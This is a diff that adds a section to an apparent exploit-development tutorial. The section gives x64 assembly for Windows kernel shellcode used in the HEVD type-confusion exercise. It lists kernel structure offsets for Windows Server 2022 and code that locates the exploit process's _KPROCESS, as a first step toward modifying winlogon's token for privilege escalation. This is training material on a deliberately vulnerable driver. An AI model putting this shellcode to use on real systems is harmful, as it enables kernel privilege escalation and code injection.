@@ -54,7 +54,47 @@ We can see that in order to get access to the process (to inject shellcode) we n
 
 ### Finding KPROCESS
 
-todo
+Lets start with the following:
+
+```
+BITS 64
+SECTION .text
+    ; OS Name:    Microsoft Windows Server 2022 Standard Evaluation
+    ; OS Version: 10.0.20348 N/A Build 20348
+    KTHREAD                 equ 0x188               ; Offset from GS register
+    KPROCESS                equ 0xb8                ; _KAPC_STATE (0x98) + 0x20 = _KPROCESS
+    ACTIVE_PROCESS_LINKS    equ 0x448               ; _LIST_ENTRY = _KPROCESS + 0x448
+    IMAGE_FILE_NAME         equ 0x5a8               ; UChar = _KPROCESS + 0x5a8
+    WINLOGON                equ 6e6f676f6c6e6977h   ; nogolniw
+    SID_OFFSET              equ 0x48                ; where the last digiti of the SID is located
+    AUTHENTICATED_USERS     equ 0x0b                ; Authenticated user SID byte
+    TOKEN                   equ 0x4b8               ; _TOKEN offset from _KRPOCESS
+    MANDATORY_POLICY        equ 0xd4                ; Policy offset from _TOKEN
+
+global main
+
+main:
+restore_stack:
+    ; restore stack early to avoid stack pivot debugging errors
+    ; this is specific to the HEVD type confusion exploit
+    mov rsp, r11
+```
+
+We will be using all of the symbols as we go through writing the shellcode. These just make it easier to adjust our shellcode for different environments where offsets might change.
+
+To find the `_KPROCESS` structure for our exploit process in the kernel we use the following:
+
+```
+find_process:
+    mov rax, [gs:KTHREAD]
+    mov rax, [rax+KPROCESS]
+    mov rcx, rax                        ; store the KPROCESS for later
+    mov r8, rax
+```
+
+At on offset of `0x188` from the `gs` segment register is the `_KTHREAD` entry for the currently executing thread, which is within our exploit process. At an offset of `0xb8` is a ponter to the `_KPROCESS` for the process. We take a copy of this location for later with the `mov rcx, rax`, and we also move it in to `r8` to use in the next section of our shellcode.
+
+`r8`, `rcx`, and `rax` all point to the `_KPROCESS` (which is the first element of the `_EPROCESS` structure) of our exploit process.
 
 ### Locating winlogon.exe
 
